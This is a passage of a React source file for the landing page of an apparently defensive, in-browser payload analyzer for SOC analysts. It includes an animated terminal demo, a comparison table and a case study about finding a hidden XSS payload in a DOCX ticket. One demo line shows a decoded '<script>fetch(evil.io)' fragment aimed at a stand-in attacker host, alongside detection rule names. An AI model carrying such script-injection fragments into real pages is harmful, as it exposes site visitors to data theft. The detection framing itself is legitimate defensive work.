import React, { useEffect, useRef, useState } from 'react'
import { motion, useReducedMotion } from 'framer-motion'
import { useNavigate } from 'react-router-dom'
import {
  Shield, Zap, Lock, Eye, GitBranch, ChevronRight, Terminal,
  Globe, AlertTriangle, CheckCircle2, X, FileText, Layers,
  Clock, Server, Wifi, Activity, Search, BookOpen,
} from 'lucide-react'
import { useMediaQuery } from '../hooks/useMediaQuery'

// ── Terminal lines — SOC analyst framing ─────────────────────────────────────
const TERMINAL_LINES = [
  { delay: 0,    text: '# Ticket #4921 — Suspicious support chat payload', type: 'cmd' },
  { delay: 700,  text: '$ zerocontext scan --file ticket-body.docx', type: 'cmd' },
  { delay: 1300, text: '[docx]   Extracted 842 chars from word/document.xml', type: 'info' },
  { delay: 1900, text: '[hidden] w:vanish run detected @ offset 318 — 47 chars', type: 'critical' },
  { delay: 2600, text: '[engine] Layer 2: URL decode → <script>fetch(evil.io)…', type: 'high' },
  { delay: 3300, text: '[rule]   XSS-014  SCRIPT_TAG_INJECTION  ██ CRITICAL (97%)', type: 'critical' },
  { delay: 4000, text: '[rule]   OBFS-003  Base64 eval() chain   ██ HIGH    (91%)', type: 'high' },
  { delay: 4700, text: '[ai]     Prompt Injection: 0.93  |  Obfuscation: 0.88', type: 'info' },
  { delay: 5400, text: '════ SEVERITY: CRITICAL ════  2 threats · 47 hidden chars · 6ms', type: 'result' },
]

const lineColor: Record<string, string> = {
  cmd: '#818cf8', info: '#64748b', critical: '#ef4444', high: '#f97316', result: '#10b981',
}

// ── Feature cards — SOC analyst framing ──────────────────────────────────────
const FEATURES = [
  {
    icon: Lock,
    title: 'Zero Upload Risk',
    tagline: 'Your payloads never touch a server',
    description: 'All analysis runs inside a Web Worker — the same CPU-isolated sandbox that your browser uses. Even if ZeroContext were compromised, your payloads stay local.',
    color: '#6366f1',
  },
  {
    icon: Layers,
    title: '5-Layer Normalization',
    tagline: 'Attackers encode. We decode first.',
    description: 'URL → Hex → Base64 → HTML-entity → Unicode NFKC before any rule fires. One pass catches raw payloads; five passes catch obfuscated ones.',
    color: '#f97316',
  },
  {
    icon: Eye,
    title: 'Hidden Text Detection',
    tagline: 'Catches what visual review misses',
    description: 'Inspects DOCX run properties for w:vanish, white-on-white text, near-zero font sizes, and double-hide tricks — the exact techniques used in ticket-injection attacks.',
    color: '#10b981',
  },
  {
    icon: Activity,
    title: 'Adversarial Mode',
    tagline: 'Test your rules against 7 evasion techniques',
    description: 'Generates double-URL, base64, homoglyph, zero-width, hex, and unicode permutations of any payload — tells you which variants would evade your current rule set.',
    color: '#c084fc',
  },
  {
    icon: FileText,
    title: 'Forensic Export',
    tagline: 'Evidence-grade output, offline-ready',
    description: 'Exports structured .docx Word tables, JSON, and a self-contained offline HTML replay — all with sanitized payloads safe to attach to a JIRA ticket or escalate to IR.',
    color: '#818cf8',
  },
  {
    icon: GitBranch,
    title: 'Explainability Trace',
    tagline: 'Show your work to the IR team',
    description: 'Every finding expands to show the full decode chain: raw → layer N → rule matched → verdict. Defensible evidence that explains exactly how the threat was found.',
    color: '#38bdf8',
  },
]

// ── Comparison table data ─────────────────────────────────────────────────────
const COMPARE_ROWS: Array<{
  capability: string
  note: string
  zc: boolean | string
  vt: boolean | string
  sandbox: boolean | string
}> = [
  { capability: 'Payload leaves your network',   note: 'Key compliance concern for IR teams',          zc: false,       vt: true,          sandbox: true },
  { capability: 'DOCX / hidden text analysis',   note: 'w:vanish, white text, near-zero font',        zc: true,        vt: false,         sandbox: 'partial' },
  { capability: 'Analysis under 10 ms',           note: 'Real-time triage during active incident',     zc: '< 6 ms',    vt: '2 – 60 s',    sandbox: '60 – 300 s' },
  { capability: 'Works air-gapped / offline',     note: 'Essential for classified environments',       zc: true,        vt: false,         sandbox: false },
  { capability: 'Adversarial evasion testing',    note: '7 obfuscation permutations per payload',      zc: true,        vt: false,         sandbox: false },
  { capability: 'Explainability trace',           note: 'Shows exact decode chain + matched rule',     zc: true,        vt: false,         sandbox: false },
  { capability: 'Account / API key required',     note: 'Friction during live incident',               zc: false,       vt: true,          sandbox: true },
  { capability: 'Structured forensic export',     note: 'DOCX + JSON + offline HTML replay',           zc: true,        vt: 'CSV only',    sandbox: 'PDF only' },
  { capability: 'Multi-layer obfuscation decode', note: 'URL + hex + base64 + entities + NFKC',       zc: true,        vt: 'partial',     sandbox: 'partial' },
  { capability: 'Zero cost, open source',         note: 'Auditable codebase, no vendor lock-in',      zc: true,        vt: 'freemium',    sandbox: '$$$ / mo' },
]

// ── Case study steps ──────────────────────────────────────────────────────────
const CASE_STEPS = [
  {
    step: '01',
    time: 'T+0 min',
    title: 'Suspicious ticket arrives',
    body: 'A support ticket arrives with an unusually formatted body. The agent notices the rendered text looks normal but the raw source contains odd whitespace. Traditional tools flag nothing — the payload is clean-looking HTML.',
    highlight: 'VT scan: 0/73 engines',
    highlightColor: '#ef4444',
    icon: AlertTriangle,
  },
  {
    step: '02',
    time: 'T+1 min',
    title: 'Drop the .docx into ZeroContext',
    body: 'The analyst exports the ticket body as a .docx and drags it into ZeroContext. The engine runs in 5 ms entirely in-browser. No data leaves the network — critical since the payload could be beaconing.',
    highlight: '0 bytes uploaded',
    highlightColor: '#10b981',
    icon: Shield,
  },
  {
    step: '03',
    time: 'T+1 min 20 s',
    title: 'Hidden text flagged — 47 chars vanish',
    body: 'ZeroContext finds a w:vanish run at offset 318: 47 characters of invisible text containing a URL-encoded XSS payload. It survived the visual review, the DLP scan, and the VT check.',
    highlight: 'w:vanish @ offset 318',
    highlightColor: '#f97316',
    icon: Eye,
  },
  {
    step: '04',
    time: 'T+2 min',
    title: 'Adversarial mode confirms rule coverage gap',
    body: 'The analyst runs Adversarial Mode to test the full obfuscation surface. Two of seven permutations (double-URL-encode and zero-width insertion) would have evaded detection — the rules team is notified.',
    highlight: '2 / 7 techniques evade rules',
    highlightColor: '#ef4444',
    icon: Zap,
  },
  {
    step: '05',
    time: 'T+3 min',
    title: 'Evidence exported, ticket escalated',
    body: 'The analyst exports a .docx report with native Word tables and an offline HTML sandbox replay. Both attach directly to the JIRA escalation ticket — no screenshots, no copy-paste, full audit trail.',
    highlight: 'Escalated with evidence in 3 min',
    highlightColor: '#10b981',
    icon: FileText,
  },
]

// ── Particle grid ─────────────────────────────────────────────────────────────
function ParticleGrid() {
  return (
    <div aria-hidden style={{ position: 'absolute', inset: 0, overflow: 'hidden', zIndex: 0, pointerEvents: 'none' }}>
      <div style={{
        position: 'absolute', top: '30%', left: '50%', transform: 'translate(-50%, -50%)',
        width: 900, height: 900,
        background: 'radial-gradient(circle, rgba(99,102,241,0.12) 0%, transparent 70%)', borderRadius: '50%',
      }} />
      <div style={{
        position: 'absolute', inset: 0,
        backgroundImage: 'radial-gradient(circle, rgba(99,102,241,0.18) 1px, transparent 1px)',
        backgroundSize: '40px 40px',
        maskImage: 'radial-gradient(ellipse 80% 60% at 50% 40%, black 30%, transparent 100%)',
        WebkitMaskImage: 'radial-gradient(ellipse 80% 60% at 50% 40%, black 30%, transparent 100%)',
      }} />
      <div style={{
        position: 'absolute', inset: 0,
        backgroundImage: `linear-gradient(to right, rgba(99,102,241,0.06) 1px, transparent 1px), linear-gradient(to bottom, rgba(99,102,241,0.06) 1px, transparent 1px)`,
        backgroundSize: '80px 80px',
      }} />
    </div>
  )
}

// ── Terminal Demo ─────────────────────────────────────────────────────────────
function TerminalDemo() {
  const [lines, setLines] = useState<typeof TERMINAL_LINES>([])
  const [cursor, setCursor] = useState(true)
  const ref = useRef<HTMLDivElement>(null)
  const reducedMotion = useReducedMotion()

  useEffect(() => {
    if (reducedMotion) { setLines(TERMINAL_LINES); return }
    const timers: ReturnType<typeof setTimeout>[] = []
    TERMINAL_LINES.forEach((line) => {
      timers.push(setTimeout(() => { setLines((prev) => [...prev, line]) }, line.delay))
    })
    const reset = setTimeout(() => { setLines([]) }, 9500)
    timers.push(reset)
    return () => timers.forEach(clearTimeout)
  }, [lines.length === 0, reducedMotion])

  useEffect(() => {
    const blink = setInterval(() => setCursor((c) => !c), 530)
    return () => clearInterval(blink)
  }, [])

  useEffect(() => {
    if (ref.current) ref.current.scrollTop = ref.current.scrollHeight
  }, [lines])

  return (
    <div style={{
      background: '#0d1117',
      border: '1px solid rgba(99,102,241,0.25)',
      borderRadius: 12, overflow: 'hidden',
      boxShadow: '0 0 60px rgba(99,102,241,0.12), 0 20px 60px rgba(0,0,0,0.5)',
      maxWidth: 640, width: '100%',
    }}>
      <div style={{
        padding: '10px 16px', borderBottom: '1px solid rgba(99,102,241,0.15)',
        display: 'flex', alignItems: 'center', gap: 6, background: '#080b12',
      }}>
        {['#ef4444', '#f97316', '#22c55e'].map((c) => (
          <div key={c} style={{ width: 10, height: 10, borderRadius: '50%', background: c }} />
        ))}
        <div style={{ flex: 1, textAlign: 'center', fontSize: '0.72rem', color: '#475569', fontFamily: 'var(--font-mono)' }}>
          zerocontext — soc-triage · ticket-body.docx
        </div>
        <Terminal size={12} color="#475569" />
      </div>
      <div ref={ref} className="mobile-terminal-body scroll-touch" style={{
        padding: '16px', fontFamily: 'var(--font-mono)', fontSize: '0.72rem',
        lineHeight: 1.7, height: 290, overflowY: 'auto', scrollbarWidth: 'none',
      }}>
        {lines.map((line, i) => (
          <motion.div
            key={`${i}-${line.text}`}
            initial={{ opacity: 0, x: -4 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.15 }}
            style={{ color: lineColor[line.type] ?? '#94a3b8', whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}
          >
            {line.text}
          </motion.div>
        ))}
        <span style={{ color: '#818cf8' }}>${cursor ? '▋' : ' '}</span>
      </div>
    </div>
  )
}

// ── Compare cell helper ───────────────────────────────────────────────────────
function CompareCell({ value }: { value: boolean | string }) {
  if (value === true)  return <span style={{ color: '#10b981', display: 'flex', alignItems: 'center', gap: 4 }}><CheckCircle2 size={14} /> Yes</span>
  if (value === false) return <span style={{ color: '#ef4444', display: 'flex', alignItems: 'center', gap: 4 }}><X size={14} /> No</span>
  if (value === 'partial') return <span style={{ color: '#eab308', fontSize: '0.78rem' }}>⚠ Partial</span>
  return <span style={{ color: '#94a3b8', fontSize: '0.78rem' }}>{value}</span>
}

// ── Main Landing Page ─────────────────────────────────────────────────────────
export const LandingPage: React.FC = () => {
  const navigate = useNavigate()
  const isMobile = useMediaQuery('(max-width: 640px)')

  return (
    <div style={{
      minHeight: '100vh', background: 'var(--bg-base)',
      color: 'var(--text-primary)', fontFamily: 'var(--font-sans)',
      display: 'flex', flexDirection: 'column',
      position: 'relative', overflow: 'hidden',
    }}>

      {/* ── Navbar ────────────────────────────────────────────────────────── */}
      <nav style={{
        position: 'sticky', top: 0, zIndex: 40,
        borderBottom: '1px solid var(--border)',
        background: 'rgba(8,11,18,0.85)',
        backdropFilter: 'blur(20px)', WebkitBackdropFilter: 'blur(20px)',
      }}>
        <div style={{
          maxWidth: 1200, margin: '0 auto', padding: '0 16px', height: 56,
          display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8,
        }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, minWidth: 0 }}>
            <motion.div animate={{ rotate: [0, 360] }} transition={{ duration: 20, repeat: Infinity, ease: 'linear' }}>
              <Shield size={20} color="var(--accent)" />
            </motion.div>
            <span style={{ fontWeight: 700, fontSize: '1rem', letterSpacing: '-0.02em', whiteSpace: 'nowrap' }}>
              Zero<span style={{ color: 'var(--accent)' }}>Context</span>
            </span>
            {!isMobile && (
              <span style={{
                fontSize: '0.6rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)',
                background: 'rgba(99,102,241,0.1)', border: '1px solid rgba(99,102,241,0.25)',
                borderRadius: 4, padding: '2px 6px', flexShrink: 0,
              }}>v1.0 BETA</span>
            )}
            {!isMobile && (
              <span style={{
                fontSize: '0.6rem', color: '#10b981', fontFamily: 'var(--font-mono)',
                background: 'rgba(16,185,129,0.1)', border: '1px solid rgba(16,185,129,0.25)',
                borderRadius: 4, padding: '2px 6px', flexShrink: 0,
              }}>● For SOC Analysts</span>
            )}
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10, flexShrink: 0 }}>
            <a
              href="https://github.com"
              target="_blank" rel="noopener noreferrer"
              style={{ color: 'var(--text-secondary)', fontSize: '0.8rem', textDecoration: 'none', display: 'flex', alignItems: 'center', gap: 5, minHeight: 44, padding: '0 4px' }}
            >
              <Globe size={15} />{!isMobile && ' GitHub'}
            </a>
            <button
              onClick={() => navigate('/analyze')}
              style={{
                padding: '8px 18px', background: 'var(--accent)', color: '#fff', border: 'none',
                borderRadius: 8, fontSize: '0.8rem', fontWeight: 600, cursor: 'pointer',
                fontFamily: 'var(--font-sans)', whiteSpace: 'nowrap', minHeight: 40,
              }}
            >
              Start Triage
            </button>
          </div>
        </div>
      </nav>

      {/* ── Hero ──────────────────────────────────────────────────────────── */}
      <section className="mobile-hero" style={{
        position: 'relative', display: 'flex', flexDirection: 'column',
        alignItems: 'center', justifyContent: 'center', textAlign: 'center',
        padding: '80px 24px 60px', flex: '0 0 auto', minHeight: '80vh',
      }}>
        <ParticleGrid />

        <div style={{ position: 'relative', zIndex: 1, maxWidth: 860 }}>

          {/* SOC badge */}
          <motion.div
            initial={{ opacity: 0, y: -12 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}
            style={{
              display: 'inline-flex', alignItems: 'center', gap: 7,
              padding: '5px 14px', background: 'rgba(99,102,241,0.12)',
              border: '1px solid rgba(99,102,241,0.3)', borderRadius: 99,
              fontSize: '0.72rem', color: 'var(--text-accent)', fontFamily: 'var(--font-mono)', marginBottom: 24,
            }}
          >
            <span style={{ width: 6, height: 6, borderRadius: '50%', background: '#10b981', boxShadow: '0 0 6px #10b981', display: 'inline-block' }} />
            Built for SOC analysts · Zero upload · Works offline
          </motion.div>

          {/* Headline — SOC trigger moment framing */}
          <motion.h1
            initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.55, delay: 0.1 }}
            style={{ fontSize: 'clamp(2.2rem, 5.5vw, 4rem)', fontWeight: 800, lineHeight: 1.08, letterSpacing: '-0.04em', margin: '0 0 20px', color: '#f1f5f9' }}
          >
            The payload looks clean.{' '}
            <span style={{ background: 'linear-gradient(135deg, #6366f1 0%, #818cf8 50%, #a78bfa 100%)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', backgroundClip: 'text' }}>
              It isn't.
            </span>
          </motion.h1>

          {/* SOC-framed sub-headline */}
          <motion.p
            initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.55, delay: 0.2 }}
            style={{ fontSize: 'clamp(1rem, 2.2vw, 1.18rem)', color: 'var(--text-secondary)', lineHeight: 1.65, maxWidth: 620, margin: '0 auto 40px' }}
          >
            ZeroContext is a <strong style={{ color: 'var(--text-primary)' }}>client-side security payload analyzer</strong> built for incident responders and SOC analysts.
            Drop in a ticket body, DOCX, or raw payload — get a full threat report in under 6 ms,
            with <strong style={{ color: '#a5b4fc' }}>zero data leaving your browser</strong>.
          </motion.p>

          {/* CTA */}
          <motion.div
            initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5, delay: 0.3 }}
            style={{ display: 'flex', gap: 12, justifyContent: 'center', flexWrap: 'wrap' }}
          >
            <motion.button
              onClick={() => navigate('/analyze')}
              whileHover={{ scale: 1.03, boxShadow: '0 0 30px rgba(99,102,241,0.5)' }}
              whileTap={{ scale: 0.97 }}
              style={{
                padding: '13px 28px', background: 'linear-gradient(135deg, #6366f1, #818cf8)', color: '#fff',
                border: 'none', borderRadius: 10, fontSize: '1rem', fontWeight: 700, cursor: 'pointer',
                fontFamily: 'var(--font-sans)', display: 'flex', alignItems: 'center', gap: 8, letterSpacing: '-0.01em',
              }}
            >
              <Search size={16} /> Start Triage Now
            </motion.button>
            <motion.a
              href="#why-not-vt"
              whileHover={{ scale: 1.03 }} whileTap={{ scale: 0.97 }}
              style={{
                padding: '13px 28px', background: 'transparent', color: 'var(--text-secondary)',
                border: '1px solid var(--border-strong)', borderRadius: 10, fontSize: '1rem',
                fontWeight: 600, cursor: 'pointer', fontFamily: 'var(--font-sans)',
                textDecoration: 'none', display: 'flex', alignItems: 'center', gap: 8,
              }}
            >
              <BookOpen size={15} /> Why Not VirusTotal?
            </motion.a>
          </motion.div>

          {/* Stats */}
          <motion.div
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.55, duration: 0.5 }}
            className="mobile-stats-row"
            style={{ display: 'flex', gap: 32, justifyContent: 'center', marginTop: 52, flexWrap: 'wrap' }}
          >
            {[
              { value: '70+', label: 'Detection Rules' },
              { value: '5',   label: 'Decode Layers' },
              { value: '< 6ms', label: 'Triage Time' },
              { value: '0',   label: 'Bytes Uploaded' },
            ].map(({ value, label }) => (
              <div key={label} style={{ textAlign: 'center' }}>
                <div style={{ fontSize: '1.6rem', fontWeight: 800, color: 'var(--text-accent)', letterSpacing: '-0.04em', fontFamily: 'var(--font-mono)' }}>{value}</div>
                <div style={{ fontSize: '0.72rem', color: 'var(--text-muted)', marginTop: 2 }}>{label}</div>
              </div>
            ))}
          </motion.div>
        </div>
      </section>

      {/* ── Terminal Demo ──────────────────────────────────────────────────── */}
      <section style={{ padding: '24px 24px 72px', display: 'flex', justifyContent: 'center', position: 'relative', zIndex: 1 }}>
        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 14 }}>
          <div style={{ fontSize: '0.72rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)', letterSpacing: '0.05em', textTransform: 'uppercase' }}>
            Live demo — SOC analyst triage workflow
          </div>
          <motion.div
            initial={{ opacity: 0, y: 30 }} whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }} transition={{ duration: 0.6 }}
          >
            <TerminalDemo />
          </motion.div>
          <div style={{ display: 'flex', gap: 16, flexWrap: 'wrap', justifyContent: 'center', marginTop: 6 }}>
            {[
              { icon: <Clock size={11} />, label: '< 6 ms triage' },
              { icon: <Server size={11} />, label: 'Zero server' },
              { icon: <Wifi size={11} />, label: 'Works offline' },
              { icon: <Eye size={11} />, label: 'Hidden text' },
            ].map((b) => (
              <span key={b.label} style={{
                display: 'inline-flex', alignItems: 'center', gap: 5,
                padding: '4px 10px', background: 'var(--glass-bg)',
                border: '1px solid var(--border)', borderRadius: 20,
                fontSize: '0.68rem', color: 'var(--text-muted)',
              }}>
                {b.icon} {b.label}
              </span>
            ))}
          </div>
        </div>
      </section>

      {/* ── Why Not VirusTotal — Comparison Table ─────────────────────────── */}
      <section id="why-not-vt" style={{
        padding: '64px 24px 80px', maxWidth: 1100, margin: '0 auto', width: '100%', position: 'relative', zIndex: 1,
      }}>
        <motion.div
          initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }}
          style={{ textAlign: 'center', marginBottom: 48 }}
        >
          <div style={{
            display: 'inline-block', padding: '4px 12px', marginBottom: 14,
            background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.25)', borderRadius: 20,
            fontSize: '0.7rem', color: '#ef4444', fontFamily: 'var(--font-mono)',
          }}>
            Why not VirusTotal / online sandboxes?
          </div>
          <h2 style={{ fontSize: 'clamp(1.5rem, 4vw, 2.2rem)', fontWeight: 800, letterSpacing: '-0.03em', margin: '0 0 14px' }}>
            Your tools <em style={{ fontStyle: 'normal', color: '#a78bfa' }}>upload</em> the evidence.
            <br />ZeroContext <em style={{ fontStyle: 'normal', color: '#10b981' }}>doesn't.</em>
          </h2>
          <p style={{ color: 'var(--text-secondary)', fontSize: '1rem', maxWidth: 580, margin: '0 auto' }}>
            Every major online scanner sends your payload to a third-party cloud.
            For IR teams, that can mean evidence contamination, data policy violations, or live beaconing payloads phoning home.
          </p>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }}
          transition={{ delay: 0.1 }}
          style={{ overflowX: 'auto' }}
        >
          <table style={{
            width: '100%', borderCollapse: 'collapse', minWidth: 600,
            background: 'var(--bg-elevated)', border: '1px solid var(--border)', borderRadius: 14,
            overflow: 'hidden',
          }}>
            <thead>
              <tr style={{ background: 'rgba(0,0,0,0.3)' }}>
                <th style={{ padding: '12px 16px', textAlign: 'left', fontSize: '0.72rem', fontWeight: 700, color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.06em', borderBottom: '1px solid var(--border)' }}>
                  Capability
                </th>
                {[
                  { label: 'ZeroContext', color: '#818cf8' },
                  { label: 'VirusTotal', color: '#64748b' },
                  { label: 'Online Sandbox', color: '#64748b' },
                ].map(({ label, color }) => (
                  <th key={label} style={{
                    padding: '12px 16px', textAlign: 'center', fontSize: '0.78rem', fontWeight: 700,
                    color, borderBottom: '1px solid var(--border)', whiteSpace: 'nowrap',
                  }}>
                    {label}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody>
              {COMPARE_ROWS.map((row, i) => (
                <motion.tr
                  key={row.capability}
                  initial={{ opacity: 0, x: -8 }}
                  whileInView={{ opacity: 1, x: 0 }}
                  viewport={{ once: true }}
                  transition={{ delay: i * 0.04 }}
                  style={{
                    borderBottom: i < COMPARE_ROWS.length - 1 ? '1px solid var(--border)' : 'none',
                    background: i % 2 === 0 ? 'transparent' : 'rgba(99,102,241,0.02)',
                  }}
                >
                  <td style={{ padding: '10px 16px' }}>
                    <div style={{ fontSize: '0.82rem', fontWeight: 600, color: 'var(--text-primary)' }}>{row.capability}</div>
                    <div style={{ fontSize: '0.68rem', color: 'var(--text-muted)', marginTop: 2 }}>{row.note}</div>
                  </td>
                  {[row.zc, row.vt, row.sandbox].map((val, ci) => (
                    <td key={ci} style={{ padding: '10px 16px', textAlign: 'center', fontSize: '0.82rem' }}>
                      <CompareCell value={val} />
                    </td>
                  ))}
                </motion.tr>
              ))}
            </tbody>
          </table>
        </motion.div>

        <motion.p
          initial={{ opacity: 0 }} whileInView={{ opacity: 1 }} viewport={{ once: true }}
          style={{ textAlign: 'center', fontSize: '0.72rem', color: 'var(--text-muted)', marginTop: 16, fontFamily: 'var(--font-mono)' }}
        >
          VirusTotal / sandbox comparisons based on publicly documented behaviour as of 2024.
        </motion.p>
      </section>

      {/* ── Case Study Walkthrough ─────────────────────────────────────────── */}
      <section style={{
        padding: '64px 24px 80px', background: 'rgba(0,0,0,0.2)',
        borderTop: '1px solid var(--border)', borderBottom: '1px solid var(--border)', position: 'relative', zIndex: 1,
      }}>
        <div style={{ maxWidth: 860, margin: '0 auto' }}>
          <motion.div
            initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }}
            style={{ textAlign: 'center', marginBottom: 56 }}
          >
            <div style={{
              display: 'inline-block', padding: '4px 12px', marginBottom: 14,
              background: 'rgba(16,185,129,0.1)', border: '1px solid rgba(16,185,129,0.25)', borderRadius: 20,
              fontSize: '0.7rem', color: '#10b981', fontFamily: 'var(--font-mono)',
            }}>
              Case Study — Ticket Injection Attack
            </div>
            <h2 style={{ fontSize: 'clamp(1.4rem, 4vw, 2.1rem)', fontWeight: 800, letterSpacing: '-0.03em', margin: '0 0 14px' }}>
              From suspicious ticket to escalated IR in 3 minutes
            </h2>
            <p style={{ color: 'var(--text-secondary)', fontSize: '1rem', maxWidth: 580, margin: '0 auto' }}>
              A walkthrough of how a SOC analyst triages a w:vanish ticket-injection attempt
              that passed VT and the DLP scanner — using only ZeroContext.
            </p>
          </motion.div>

          {/* Steps */}
          <div style={{ position: 'relative' }}>
            {/* Vertical connecting line */}
            <div style={{
              position: 'absolute', left: isMobile ? 20 : 36, top: 24, bottom: 24, width: 2,
              background: 'linear-gradient(to bottom, rgba(99,102,241,0.4), rgba(16,185,129,0.4))',
              zIndex: 0,
            }} />

            {CASE_STEPS.map((step, i) => {
              const isLast = i === CASE_STEPS.length - 1
              return (
                <motion.div
                  key={step.step}
                  initial={{ opacity: 0, x: -16 }}
                  whileInView={{ opacity: 1, x: 0 }}
                  viewport={{ once: true }}
                  transition={{ delay: i * 0.1, duration: 0.45 }}
                  style={{
                    display: 'flex', gap: isMobile ? 16 : 28, alignItems: 'flex-start',
                    marginBottom: isLast ? 0 : 36, position: 'relative', zIndex: 1,
                  }}
                >
                  {/* Step number circle */}
                  <div style={{
                    width: isMobile ? 40 : 72, height: isMobile ? 40 : 72, flexShrink: 0,
                    borderRadius: '50%',
                    background: isLast ? 'rgba(16,185,129,0.15)' : 'rgba(99,102,241,0.12)',
                    border: `2px solid ${isLast ? 'rgba(16,185,129,0.4)' : 'rgba(99,102,241,0.3)'}`,
                    display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column',
                    gap: 2,
                  }}>
                    <step.icon size={isMobile ? 16 : 20} color={isLast ? '#10b981' : '#818cf8'} />
                    {!isMobile && (
                      <span style={{ fontSize: '0.6rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>{step.step}</span>
                    )}
                  </div>

                  {/* Content */}
                  <div style={{
                    flex: 1, background: 'var(--bg-elevated)',
                    border: '1px solid var(--border)', borderRadius: 12, padding: '18px 20px',
                  }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 8, flexWrap: 'wrap' }}>
                      <span style={{
                        fontFamily: 'var(--font-mono)', fontSize: '0.65rem',
                        color: 'var(--text-muted)', background: 'var(--glass-bg)',
                        padding: '2px 8px', borderRadius: 4, whiteSpace: 'nowrap',
                      }}>{step.time}</span>
                      <h3 style={{ fontSize: '0.9rem', fontWeight: 700, margin: 0, color: 'var(--text-primary)' }}>{step.title}</h3>
                    </div>
                    <p style={{ fontSize: '0.83rem', color: 'var(--text-secondary)', lineHeight: 1.65, margin: '0 0 12px' }}>
                      {step.body}
                    </p>
                    <div style={{
                      display: 'inline-flex', alignItems: 'center', gap: 6,
                      padding: '4px 10px', borderRadius: 6,
                      background: `${step.highlightColor}12`,
                      border: `1px solid ${step.highlightColor}35`,
                      fontSize: '0.72rem', fontFamily: 'var(--font-mono)', color: step.highlightColor,
                    }}>
                      {step.highlight}
                    </div>
                  </div>
                </motion.div>
              )
            })}
          </div>
        </div>
      </section>

      {/* ── Features Grid ─────────────────────────────────────────────────── */}
      <section style={{ padding: '64px 24px 80px', maxWidth: 1100, margin: '0 auto', width: '100%', position: 'relative', zIndex: 1 }}>
        <motion.div
          initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }}
          style={{ textAlign: 'center', marginBottom: 48 }}
        >
          <h2 style={{ fontSize: 'clamp(1.5rem, 4vw, 2.2rem)', fontWeight: 800, letterSpacing: '-0.03em', margin: '0 0 12px' }}>
            Built for the <em style={{ fontStyle: 'normal', color: '#818cf8' }}>worst-case ticket</em>
          </h2>
          <p style={{ color: 'var(--text-secondary)', fontSize: '1rem', margin: 0, maxWidth: 540, marginInline: 'auto' }}>
            Every feature was designed around the zero-trust principle — your payloads are dangerous; the tool must not make them worse.
          </p>
        </motion.div>

        <div className="mobile-features-grid" style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: 20 }}>
          {FEATURES.map((f, i) => (
            <motion.div
              key={f.title}
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ delay: i * 0.07, duration: 0.4 }}
              whileHover={{ y: -5, boxShadow: `0 16px 48px rgba(0,0,0,0.35), 0 0 0 1px ${f.color}30` }}
              style={{
                background: 'var(--bg-elevated)', border: '1px solid var(--border)',
                borderRadius: 14, padding: '26px 22px', cursor: 'default', transition: 'border-color 0.2s',
              }}
            >
              <div style={{
                width: 42, height: 42, borderRadius: 10,
                background: `${f.color}18`, border: `1px solid ${f.color}30`,
                display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: 14,
              }}>
                <f.icon size={20} color={f.color} />
              </div>
              <h3 style={{ fontSize: '0.95rem', fontWeight: 700, margin: '0 0 4px', color: 'var(--text-primary)' }}>{f.title}</h3>
              <div style={{ fontSize: '0.7rem', color: f.color, fontFamily: 'var(--font-mono)', marginBottom: 10 }}>{f.tagline}</div>
              <p style={{ fontSize: '0.82rem', color: 'var(--text-secondary)', lineHeight: 1.65, margin: 0 }}>{f.description}</p>
            </motion.div>
          ))}
        </div>
      </section>

      {/* ── CTA Banner ────────────────────────────────────────────────────── */}
      <section style={{ padding: '64px 24px', textAlign: 'center', position: 'relative', zIndex: 1 }}>
        <div className="mobile-cta-banner" style={{
          maxWidth: 620, margin: '0 auto', padding: '52px 40px',
          background: 'linear-gradient(135deg, rgba(99,102,241,0.12) 0%, rgba(139,92,246,0.08) 100%)',
          border: '1px solid rgba(99,102,241,0.25)', borderRadius: 20,
        }}>
          <motion.div initial={{ opacity: 0, scale: 0.96 }} whileInView={{ opacity: 1, scale: 1 }} viewport={{ once: true }}>
            <div style={{
              width: 56, height: 56, borderRadius: '50%',
              background: 'rgba(99,102,241,0.2)',
              display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px',
            }}>
              <Shield size={26} color="var(--accent)" />
            </div>
            <div style={{
              display: 'inline-block', padding: '3px 10px', marginBottom: 16,
              background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.25)', borderRadius: 20,
              fontSize: '0.7rem', color: '#ef4444', fontFamily: 'var(--font-mono)',
            }}>
              0/73 engines detected it. ZeroContext did.
            </div>
            <h2 style={{ fontSize: 'clamp(1.3rem, 4vw, 1.9rem)', fontWeight: 800, letterSpacing: '-0.03em', margin: '0 0 12px' }}>
              Got a suspicious payload?
            </h2>
